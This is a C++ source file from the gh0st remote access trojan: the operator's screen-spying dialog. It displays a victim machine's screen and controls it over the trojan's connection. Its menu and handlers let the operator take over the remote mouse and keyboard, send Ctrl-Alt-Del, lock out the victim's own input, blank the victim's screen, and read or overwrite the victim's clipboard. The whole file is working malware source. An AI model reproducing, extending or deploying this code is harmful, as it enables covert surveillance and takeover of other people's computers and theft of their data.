// ScreenSpyDlg.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "ScreenSpyDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif
/////////////////////////////////////////////////////////////////////////////
// CScreenSpyDlg dialog

typedef struct
{
	DWORD	dwCtrlID;
	BOOL	bMove;
	WORD	x;
	WORD	y;
	UINT	uChar;
	UINT	nFlags;
}MOUSEKEYCTRL,*PMOUSEKEYCTRL;

enum
{
	IDM_CONTROL = 0x0010,
	IDM_SEND_CTRL_ALT_DEL,
	IDM_TRACE_CURSOR,	// 跟踪显示远程鼠标
	IDM_BLOCK_INPUT,	// 锁定远程计算机输入
	IDM_BLANK_SCREEN,	// 黑屏
	IDM_GET_CLIPBOARD,
	IDM_SET_CLIPBOARD,
	IDM_DEEP_1,
	IDM_DEEP_4_GRAY,
	IDM_DEEP_4_COLOR,
	IDM_DEEP_8_GRAY,
	IDM_DEEP_8_COLOR,
	IDM_DEEP_16,
	IDM_DEEP_32
};

CScreenSpyDlg::CScreenSpyDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CScreenSpyDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CScreenSpyDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT

	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	m_bIsFirst		= true; // 如果是第一次打开对话框，显示提示等待信息

	char szPath[MAX_PATH];
	GetSystemDirectory(szPath, MAX_PATH);
	lstrcat(szPath, "\\shell32.dll");
	m_hIcon = ExtractIcon(AfxGetApp()->m_hInstance, szPath, 17/*网上邻居图标索引*/);

	
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
	
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

	UINT	nBISize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	m_lpbmi = (BITMAPINFO *) new BYTE[nBISize];
	m_lpbmi_rect = (BITMAPINFO *) new BYTE[nBISize];

	memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
	memcpy(m_lpbmi_rect, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);

	m_lpScreenDIB = (LPVOID)VirtualAlloc(NULL, m_lpbmi->bmiHeader.biSizeImage, MEM_COMMIT, PAGE_READWRITE);
	memset(&m_MMI, 0, sizeof(MINMAXINFO));

	m_bIsCtrl = false; // 默认不控制
	m_nCount = 0;
}

void CScreenSpyDlg::OnClose()
{

	// TODO: Add your message handler code here and/or call default
	m_pContext->m_Dialog[0] = 0;

	closesocket(m_pContext->m_Socket);

	::ReleaseDC(m_hWnd, m_hDC);
	DeleteObject(m_hFullBitmap);

	if (m_lpbmi)
		delete	m_lpbmi;
	if (m_lpbmi_rect)
		delete	m_lpbmi_rect;

	DrawDibClose(m_hDD);

	SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_ARROW));

	m_bIsCtrl = false;
	CDialog::OnClose();
}

void CScreenSpyDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CScreenSpyDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CScreenSpyDlg, CDialog)
	//{{AFX_MSG_MAP(CScreenSpyDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_SIZE()
	ON_WM_CLOSE()
	ON_WM_TIMER()
	ON_WM_HSCROLL()
	ON_WM_VSCROLL()
	ON_MESSAGE(WM_GETMINMAXINFO, OnGetMiniMaxInfo)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CScreenSpyDlg message handlers

void CScreenSpyDlg::OnReceiveComplete()
{
	m_nCount++;

	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_FIRSTSCREEN:
		DrawFirstScreen();
		break;
	case TOKEN_NEXTSCREEN:
		DrawNextScreen();
		break;
	case TOKEN_BITMAPINFO:
		ResetScreen();
		break;
	case TOKEN_CLIPBOARD_TEXT:
		UpdateLocalClipboard((char *)m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
		break;
	default:
		// 传输发生异常数据
		return;
	}
}

void CScreenSpyDlg::SendResetScreen(int	nBitCount)
{
	m_nBitCount = nBitCount;

	BYTE	bBuff[5];
	bBuff[0] = COMMAND_SCREEN_RESET;
	memcpy(&bBuff[1], &m_nBitCount, 4);
	m_iocpServer->Send(m_pContext, &bBuff[0], sizeof(bBuff));
}

BOOL CScreenSpyDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	// when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		//pSysMenu->DeleteMenu(SC_TASKLIST, MF_BYCOMMAND);
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_CONTROL, "控制屏幕(&Y)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SEND_CTRL_ALT_DEL, "发送Ctrl-Alt-Del(&K)");
		pSysMenu->AppendMenu(MF_STRING, IDM_TRACE_CURSOR, "跟踪服务端鼠标(&T)");
		pSysMenu->AppendMenu(MF_STRING, IDM_BLOCK_INPUT, "锁定服务端鼠标和键盘(&L)");
		pSysMenu->AppendMenu(MF_STRING, IDM_BLANK_SCREEN, "服务端黑屏(&B)");
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, "获取剪贴板(&R)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, "设置剪贴板(&L)");
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_1, "1 位黑白(&A)");
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_4_GRAY, "4 位灰度(&B)");
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_4_COLOR, "4 位彩色(&C)");
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_8_GRAY,  "8 位灰度(&D)");
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_8_COLOR, "8 位彩色(&E)");
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_16, "16位高彩(&F)");
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_32, "32位真彩(&G)");
		
		pSysMenu->CheckMenuRadioItem(IDM_DEEP_4_GRAY, IDM_DEEP_32, IDM_DEEP_8_COLOR, MF_BYCOMMAND);
	}
	
	// TODO: Add extra initialization here
	CString str;
	str.Format("\\\\%s %d * %d", m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight);
	SetWindowText(str);
	SetTimer(1, 200, NULL);

	SetScrollRange(SB_HORZ, 0, m_lpbmi->bmiHeader.biWidth);  
	SetScrollRange(SB_VERT, 0, m_lpbmi->bmiHeader.biHeight);
	SetScrollPos(SB_HORZ, 0);
	SetScrollPos(SB_VERT, 0);
	m_HScrollPos = 0;
	m_VScrollPos = 0;
	m_hRemoteCursor = LoadCursor(NULL, IDC_ARROW);
	::GetIconInfo(m_hRemoteCursor, &m_CursorInfo);
	if (m_CursorInfo.hbmMask != NULL)
		::DeleteObject(m_CursorInfo.hbmMask);
	if (m_CursorInfo.hbmColor != NULL)
		::DeleteObject(m_CursorInfo.hbmColor);

	m_RemoteCursorPos.x = 0;
	m_RemoteCursorPos.x = 0;
	m_bIsTraceCursor = false;
	m_bIsBlockInput	= false;
	m_bIsBlankScreen = false;
	// 初始化窗口大小结构
	m_hDD = DrawDibOpen();
	m_hDC = GetDC()->m_hDC;
	m_hMemDC = CreateCompatibleDC(m_hDC);
	m_hFullBitmap = CreateDIBSection(m_hDC, m_lpbmi, DIB_RGB_COLORS, &m_lpScreenDIB, NULL, NULL);
	SelectObject(m_hMemDC, m_hFullBitmap);
	InitMMI();

	SendNext();
	return TRUE;  // return TRUE unless you set the focus to a control
	// EXCEPTION: OCX Property Pages should return FALSE
}

void CScreenSpyDlg::ResetScreen()
{
	UINT	nBISize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	if (m_lpbmi != NULL)
	{
		delete	m_lpbmi;
		delete	m_lpbmi_rect;

		m_lpbmi = (BITMAPINFO *) new BYTE[nBISize];
		m_lpbmi_rect = (BITMAPINFO *) new BYTE[nBISize];

		memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
		memcpy(m_lpbmi_rect, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);

		DeleteObject(m_hFullBitmap);
		m_hFullBitmap = CreateDIBSection(m_hDC, m_lpbmi, DIB_RGB_COLORS, &m_lpScreenDIB, NULL, NULL);
		SelectObject(m_hMemDC, m_hFullBitmap);

		memset(&m_MMI, 0, sizeof(MINMAXINFO));
		InitMMI();
	}	
}

void CScreenSpyDlg::DrawFirstScreen()
{
	m_bIsFirst = false;
	memcpy(m_lpScreenDIB, m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_lpbmi->bmiHeader.biSizeImage);

	OnPaint();
}


void CScreenSpyDlg::DrawNextScreen()
{

	LPVOID	lpFirstScreen = m_lpScreenDIB;
	LPVOID	lpNextScreen = m_pContext->m_DeCompressionBuffer.GetBuffer(1);
	DWORD	dwBytes = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;

	memcpy(&m_RemoteCursorPos, m_pContext->m_DeCompressionBuffer.GetBuffer(1), sizeof(POINT));

	DWORD	dwOffset = sizeof(POINT);

	while (dwOffset < dwBytes)
	{
		LPRECT	lpRect = (LPRECT)((LPBYTE)lpNextScreen + dwOffset);
		int	nRectWidth = lpRect->right - lpRect->left;
		int	nRectHeight = lpRect->bottom - lpRect->top;

		m_lpbmi_rect->bmiHeader.biWidth = nRectWidth;
		m_lpbmi_rect->bmiHeader.biHeight = nRectHeight;
		m_lpbmi_rect->bmiHeader.biSizeImage = (((m_lpbmi_rect->bmiHeader.biWidth * m_lpbmi_rect->bmiHeader.biBitCount + 31) & ~31) >> 3) 
			* m_lpbmi_rect->bmiHeader.biHeight;

		StretchDIBits(m_hMemDC, lpRect->left, lpRect->top, nRectWidth,
			nRectHeight, 0, 0, nRectWidth, nRectHeight, (LPBYTE)lpNextScreen + dwOffset + sizeof(RECT),
     	 		   m_lpbmi_rect, DIB_RGB_COLORS, SRCCOPY);
		// Direct draw to Client
		if (!m_bIsTraceCursor)
			StretchDIBits(m_hDC, lpRect->left - m_HScrollPos, lpRect->top - m_VScrollPos, nRectWidth,
 				nRectHeight, 0, 0, nRectWidth, nRectHeight, (LPBYTE)lpNextScreen + dwOffset + sizeof(RECT),
				m_lpbmi_rect, DIB_RGB_COLORS, SRCCOPY);

		dwOffset += sizeof(RECT) + m_lpbmi_rect->bmiHeader.biSizeImage;
	}

	if (m_bIsTraceCursor) OnPaint();	
}

void CScreenSpyDlg::OnPaint() 
{
	CPaintDC dc(this); // device context for painting
	
	
	// TODO: Add your message handler code here
	if (m_bIsFirst)
	{
		DrawTipString("Please wait - initial screen loading");
		return;
	}

	BitBlt
		(
		m_hDC,
		0,
		0,
		m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight,
		m_hMemDC,
		m_HScrollPos,
		m_VScrollPos,
		SRCCOPY
		);

	// Draw the cursor
	if (m_bIsTraceCursor)
		DrawIconEx(
			m_hDC,									// handle to device context 
			m_RemoteCursorPos.x - ((int) m_CursorInfo.xHotspot) - m_HScrollPos, 
			m_RemoteCursorPos.y - ((int) m_CursorInfo.yHotspot) - m_VScrollPos,
			m_hRemoteCursor,									// handle to icon to draw 
			0,0,										// width of the icon 
			0,											// index of frame in animated cursor 
			NULL,										// handle to background brush 
			DI_NORMAL | DI_COMPAT						// icon-drawing flags 
			);

	// Do not call CDialog::OnPaint() for painting messages
}

void CScreenSpyDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);
	
	// TODO: Add your message handler code here
	RECT rect;
	GetClientRect(&rect);
	
	if ((rect.right + m_HScrollPos) > m_lpbmi->bmiHeader.biWidth)
		InterlockedExchange((PLONG)&m_HScrollPos, m_lpbmi->bmiHeader.biWidth - rect.right);
	
	if ((rect.bottom + m_VScrollPos) > m_lpbmi->bmiHeader.biHeight)
		InterlockedExchange((PLONG)&m_VScrollPos, m_lpbmi->bmiHeader.biHeight - rect.bottom);

	SetScrollPos(SB_HORZ, m_HScrollPos);
	SetScrollPos(SB_VERT, m_VScrollPos);
}

void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if (nID == IDM_CONTROL)
	{
		m_bIsCtrl = !m_bIsCtrl;
		GetSystemMenu(FALSE)->CheckMenuItem(IDM_CONTROL, m_bIsCtrl ? MF_CHECKED : MF_UNCHECKED);
		if (m_bIsCtrl)
		{
			if (m_bIsTraceCursor)
				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DOT));
			else
				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_hRemoteCursor);
		}
		else
			SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
	}
	else if (nID == IDM_SEND_CTRL_ALT_DEL)
	{
		BYTE	bToken = COMMAND_SCREEN_CTRL_ALT_DEL;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
	}
	else if (nID == IDM_TRACE_CURSOR)
	{
		m_bIsTraceCursor = !m_bIsTraceCursor;
		GetSystemMenu(FALSE)->CheckMenuItem(IDM_TRACE_CURSOR, m_bIsTraceCursor ? MF_CHECKED : MF_UNCHECKED);
		if (m_bIsCtrl)
		{
			if (!m_bIsTraceCursor)
				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_hRemoteCursor);
			else
				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DOT));
		}
	}
	else if (nID == IDM_BLOCK_INPUT)
	{
		m_bIsBlockInput = !m_bIsBlockInput;
		GetSystemMenu(FALSE)->CheckMenuItem(IDM_BLOCK_INPUT, m_bIsBlockInput ? MF_CHECKED : MF_UNCHECKED);

		BYTE	bToken = COMMAND_SCREEN_BLOCK_INPUT;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
	}
	else if (nID == IDM_BLANK_SCREEN)
	{
		m_bIsBlankScreen = !m_bIsBlankScreen;
		GetSystemMenu(FALSE)->CheckMenuItem(IDM_BLANK_SCREEN, m_bIsBlankScreen ? MF_CHECKED : MF_UNCHECKED);

		BYTE	bToken = COMMAND_SCREEN_BLANK;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
	}
	else if (nID == IDM_GET_CLIPBOARD)
	{
		BYTE	bToken = COMMAND_SCREEN_GET_CLIPBOARD;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
	}
	else if (nID == IDM_SET_CLIPBOARD)
	{
		SendLocalClipboard();
	}
	else if (nID == IDM_DEEP_1)
	{
		SendResetScreen(1);
		GetSystemMenu(FALSE)->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_1, MF_BYCOMMAND);
	}
	else if (nID == IDM_DEEP_4_GRAY)
	{
		SendResetScreen(3);
		GetSystemMenu(FALSE)->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_4_GRAY, MF_BYCOMMAND);
	}
	else if (nID == IDM_DEEP_4_COLOR)
	{
		SendResetScreen(4);
		GetSystemMenu(FALSE)->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_4_COLOR, MF_BYCOMMAND);
	}
	else if (nID == IDM_DEEP_8_GRAY)
	{
		SendResetScreen(7);
		GetSystemMenu(FALSE)->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_8_GRAY, MF_BYCOMMAND);
	}
	else if (nID == IDM_DEEP_8_COLOR)
	{
		SendResetScreen(8);
		GetSystemMenu(FALSE)->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_8_COLOR, MF_BYCOMMAND);
	}
	else if (nID == IDM_DEEP_16)
	{
		SendResetScreen(16);
		GetSystemMenu(FALSE)->CheckMenuRadioItem(IDM_DEEP_1, IDM_DEEP_32, IDM_DEEP_16, MF_BYCOMMAND);
	}
	else if (nID == IDM_DEEP_32)
	{
		SendResetScreen(32);
		GetSystemMenu(FALSE)->CheckMenuRadioItem(IDM_DEEP_4_GRAY, IDM_DEEP_32, IDM_DEEP_32, MF_BYCOMMAND);
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}
LRESULT	CScreenSpyDlg::OnGetMiniMaxInfo(WPARAM wParam, LPARAM lparam)
{	
	// 如果m_MMI已经被赋值
	if (m_MMI.ptMaxSize.x > 0)
		memcpy((void *)lparam, &m_MMI, sizeof(MINMAXINFO));

	return NULL;
}

void CScreenSpyDlg::DrawTipString(CString str)
{
	HDC	hDC = GetDC()->m_hDC;
	RECT rect;
	GetClientRect(&rect);
	COLORREF bgcol = RGB(0x00, 0x00, 0x00);	
	COLORREF oldbgcol  = SetBkColor(hDC, bgcol);
	COLORREF oldtxtcol = SetTextColor(hDC, RGB(0xff,0xff,0xff));
	ExtTextOut(m_hDC, 0, 0, ETO_OPAQUE, &rect, NULL, 0, NULL);

	DrawText (hDC, str, -1, &rect,
		DT_SINGLELINE | DT_CENTER | DT_VCENTER);
	
	SetBkColor(hDC, oldbgcol);
	SetTextColor(hDC, oldtxtcol);
/*	InvalidateRect(NULL, FALSE);*/
}

void CScreenSpyDlg::InitMMI()
{
	RECT	rectClient, rectWindow;
	GetWindowRect(&rectWindow);
	GetClientRect(&rectClient);
	ClientToScreen(&rectClient);
	
	int nWidthAdd = (rectClient.left - rectWindow.left) + (rectWindow.right - rectClient.right);
	int nHeightAdd = (rectClient.top - rectWindow.top) + (rectWindow.bottom - rectClient.bottom);
	
	
	int	nMinWidth = 400 + nWidthAdd;
	int	nMinHeight = 300 + nHeightAdd;
	int	nMaxWidth = m_lpbmi->bmiHeader.biWidth + nWidthAdd;
	int	nMaxHeight = m_lpbmi->bmiHeader.biHeight + nHeightAdd;
	
	
	// 最小的Track尺寸
	m_MMI.ptMinTrackSize.x = nMinWidth;
	m_MMI.ptMinTrackSize.y = nMinHeight;
	
	// 最大化时窗口的位置
	m_MMI.ptMaxPosition.x = 1;
	m_MMI.ptMaxPosition.y = 1;
	
	// 窗口最大尺寸
	m_MMI.ptMaxSize.x = nMaxWidth;
	m_MMI.ptMaxSize.y = nMaxHeight;
	
	// 最大的Track尺寸也要改变
	m_MMI.ptMaxTrackSize.x = nMaxWidth;
	m_MMI.ptMaxTrackSize.y = nMaxHeight;
}

BOOL CScreenSpyDlg::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	CRect rect;
	GetClientRect(&rect);

	switch (pMsg->message)
	{
	case WM_LBUTTONDOWN:
	case WM_LBUTTONUP:
	case WM_RBUTTONDOWN:
	case WM_RBUTTONUP:
	case WM_MOUSEMOVE:
	case WM_LBUTTONDBLCLK:
	case WM_RBUTTONDBLCLK:
		SendCommand
			(
			pMsg->message,
			true,
			LOWORD(pMsg->lParam) + m_HScrollPos,
			HIWORD(pMsg->lParam) + m_VScrollPos
			);
		break;
  	case WM_KEYDOWN:
  	case WM_KEYUP:
	case WM_SYSKEYDOWN:
	case WM_SYSKEYUP:
 		if (pMsg->wParam != VK_LWIN && pMsg->wParam != VK_RWIN)
 			SendCommand
 			(
 			pMsg->message, 
 			false,
 			0,
 			0,
 			pMsg->wParam,
 			pMsg->lParam
 			);
		if (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE)
			return true;
		break;
	default:
		break;
	}

	return CDialog::PreTranslateMessage(pMsg);
}

void CScreenSpyDlg::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default

	try
	{
		if (m_pContext == NULL)
			return;
		CString str;
		str.Format("\\\\%s %d * %d 第%d帧 %d%%", m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight,
			m_nCount, m_pContext->m_nTransferProgress);
		SetWindowText(str);

		if ((GetTickCount() - m_pContext->m_nLastRead) > 5000)
		{
			//KillTimer(nIDEvent);
			//::MessageBox(m_hWnd, "远程服务端已关闭", "警告", MB_OK);
			//CloseWindow();
		}
	}catch (...){}

	CDialog::OnTimer(nIDEvent);
}

void CScreenSpyDlg::PostNcDestroy() 
{
	// TODO: Add your specialized code here and/or call the base class
	delete this;
	CDialog::PostNcDestroy();
}

void CScreenSpyDlg::SendCommand(DWORD dwCtrlID, BOOL bMove, int x, int y, UINT uChar, UINT nFlags)
{
	if (!m_bIsCtrl)
		return;

	LPBYTE lpData = new BYTE[sizeof(MOUSEKEYCTRL) + 1];

	lpData[0] = COMMAND_SCREEN_CONTROL;

	MOUSEKEYCTRL	mkc;
	memset(&mkc, 0, sizeof(MOUSEKEYCTRL));
	mkc.dwCtrlID = dwCtrlID;
	mkc.bMove = bMove;
	mkc.x = x;
	mkc.y = y;
	mkc.uChar = uChar;
	mkc.nFlags = nFlags;

	memcpy(lpData + 1, &mkc, sizeof(MOUSEKEYCTRL));

	m_iocpServer->Send(m_pContext, lpData, sizeof(MOUSEKEYCTRL) + 1);

	delete [] lpData;

}

void CScreenSpyDlg::OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar) 
{
	// TODO: Add your message handler code here and/or call default
	
	SCROLLINFO si;
	int	i;
	si.cbSize = sizeof(SCROLLINFO);
	si.fMask = SIF_ALL;
	GetScrollInfo(SB_HORZ, &si);
	
	switch (nSBCode)
	{
	case SB_LINEUP:
		i = nPos - 1;
		break;
	case SB_LINEDOWN:
		i = nPos + 1;
		break;
	case SB_THUMBPOSITION:
	case SB_THUMBTRACK:
		i = si.nTrackPos;
		break;
	default:
		return;
	}
	
 	i = max(i, si.nMin);
	i = min(i, (int)(si.nMax - si.nPage + 1));

	RECT rect;
 	GetClientRect(&rect);

	if ((rect.right + i) > m_lpbmi->bmiHeader.biWidth)
		i = m_lpbmi->bmiHeader.biWidth - rect.right;

	InterlockedExchange((PLONG)&m_HScrollPos, i);
	
	SetScrollPos(SB_HORZ, m_HScrollPos);
	
	OnPaint();
	CDialog::OnHScroll(nSBCode, nPos, pScrollBar);
}

void CScreenSpyDlg::OnVScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar) 
{
	// TODO: Add your message handler code here and/or call default
	SCROLLINFO si;
	int	i;
	si.cbSize = sizeof(SCROLLINFO);
	si.fMask = SIF_ALL;
	GetScrollInfo(SB_VERT, &si);
	
	switch (nSBCode)
	{
	case SB_LINEUP:
		i = nPos - 1;
		break;
	case SB_LINEDOWN:
		i = nPos + 1;
		break;
	case SB_THUMBPOSITION:
	case SB_THUMBTRACK:
		i = si.nTrackPos;
		break;
	default:
		return;
	}
	
 	i = max(i, si.nMin);
 	i = min(i, (int)(si.nMax - si.nPage + 1));


	RECT rect;
	GetClientRect(&rect);
	
	if ((rect.bottom + i) > m_lpbmi->bmiHeader.biHeight)
		i = m_lpbmi->bmiHeader.biHeight - rect.bottom;

	InterlockedExchange((PLONG)&m_VScrollPos, i);

	SetScrollPos(SB_VERT, i);
	OnPaint();
	CDialog::OnVScroll(nSBCode, nPos, pScrollBar);
}

void CScreenSpyDlg::UpdateLocalClipboard(char *buf, int len)
{
	if (!::OpenClipboard(NULL))
		return;
	
	::EmptyClipboard();
	HGLOBAL hglbCopy = GlobalAlloc(GPTR, len);
	if (hglbCopy != NULL) { 
		// Lock the handle and copy the text to the buffer.  
		LPTSTR lptstrCopy = (LPTSTR) GlobalLock(hglbCopy); 
		memcpy(lptstrCopy, buf, len); 
		GlobalUnlock(hglbCopy);          // Place the handle on the clipboard.  
		SetClipboardData(CF_TEXT, hglbCopy);
		GlobalFree(hglbCopy);
	}
	CloseClipboard();
}

void CScreenSpyDlg::SendLocalClipboard()
{
	if (!::OpenClipboard(NULL))
		return;
	HGLOBAL hglb = GetClipboardData(CF_TEXT);
	if (hglb == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	nPacketLen = GlobalSize(hglb) + 1;
	LPSTR lpstr = (LPSTR) GlobalLock(hglb);  
	LPBYTE	lpData = new BYTE[nPacketLen];
	lpData[0] = COMMAND_SCREEN_SET_CLIPBOARD;
	memcpy(lpData + 1, lpstr, nPacketLen - 1);
	::GlobalUnlock(hglb);
	::CloseClipboard();
	m_iocpServer->Send(m_pContext, lpData, nPacketLen);
	delete [] lpData;
}

void CScreenSpyDlg::SendNext()
{
	BYTE	bBuff = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}
